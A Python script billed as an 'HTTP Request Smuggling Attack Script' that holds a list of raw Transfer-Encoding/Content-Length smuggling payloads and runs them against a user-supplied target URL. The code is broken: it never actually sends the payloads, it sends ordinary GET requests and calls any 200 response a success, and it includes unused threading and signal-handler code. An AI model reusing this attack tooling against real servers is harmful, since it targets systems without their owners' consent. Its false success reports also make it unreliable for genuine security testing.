import argparse
import requests
import threading
import time
import sys
from colorama import Fore, Style
from urllib.parse import urlparse

# Constants for colors
SUCCESS_COLOR = Fore.GREEN
INFO_COLOR = Fore.YELLOW
ERROR_COLOR = Fore.RED
RESET_COLOR = Style.RESET_ALL

# Common HTTP Smuggling Payloads
smuggling_payloads = [
    "POST / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n",
    "GET / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n",
    "POST / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\nContent-Length: 5\r\n\r\n5\r\n0\r\n\r\n",
    "GET / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\nContent-Length: 5\r\n\r\n5\r\n0\r\n\r\n",
    "POST / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n0\r\n\r\n",
    "GET / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n0\r\n\r\n",
    "POST / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\nContent-Length: 5\r\n\r\n0\r\n5\r\n\r\n",
    "GET / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\nContent-Length: 5\r\n\r\n0\r\n5\r\n\r\n",
]

# Function to perform HTTP smuggling attack
def send_smuggling_request(url, proxy, headers, payload, timeout, verbose):
    try:
        # Print verbose output
        if verbose:
            print(f"{INFO_COLOR}Attempting to send payload: {payload}{RESET_COLOR}")

        # Send the request with a proxy, timeout, and SSL verification disabled
        response = requests.get(url, headers=headers, proxies=proxy, timeout=timeout, verify=False)

        if verbose:
            print(f"{INFO_COLOR}Received status code: {response.status_code}{RESET_COLOR}")
            print(f"{INFO_COLOR}Response headers: {response.headers}{RESET_COLOR}")
            print(f"{INFO_COLOR}Response body: {response.text[:200]}...{RESET_COLOR}")

        if response.status_code == 200:
            print(f"{SUCCESS_COLOR}Potential success with payload: {payload}{RESET_COLOR}")
        else:
            print(f"{ERROR_COLOR}Failed attempt with status code: {response.status_code}{RESET_COLOR}")
    except requests.exceptions.RequestException as e:
        print(f"{ERROR_COLOR}Request error: {str(e)}{RESET_COLOR}")

# Function to run the attack in threads
def run_attack(url, proxy, headers, timeout, verbose):
    for payload in smuggling_payloads:
        send_smuggling_request(url, proxy, headers, payload, timeout, verbose)

# Handling Ctrl+C to gracefully terminate
def graceful_exit(signal, frame):
    print(f"{ERROR_COLOR}Exiting gracefully...{RESET_COLOR}")
    sys.exit(0)

# Main function to parse arguments
def main():
    parser = argparse.ArgumentParser(description="HTTP Request Smuggling Attack Script")
    
    parser.add_argument("url", help="Target URL to attack (e.g., http://example.com)")
    parser.add_argument("-p", "--proxy", help="Proxy to use for requests (e.g., http://127.0.0.1:8080)", default=None)
    parser.add_argument("-t", "--timeout", help="Timeout for requests in seconds", type=int, default=10)
    parser.add_argument("-v", "--verbose", help="Enable verbose output", action="store_true")
    parser.add_argument("-H", "--headers", help="Custom headers as a comma-separated key:value list", default=None)
    
    args = parser.parse_args()
    
    # Parse headers
    headers = {}
    if args.headers:
        for header in args.headers.split(","):
            key, value = header.split(":")
            headers[key.strip()] = value.strip()

    # Parse proxy
    proxy = None
    if args.proxy:
        proxy = {
            "http": args.proxy,
            "https": args.proxy
        }
    
    # Run the attack
    run_attack(args.url, proxy, headers, args.timeout, args.verbose)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"{ERROR_COLOR}\nDetected Ctrl+C, terminating script.{RESET_COLOR}")
        sys.exit(0)
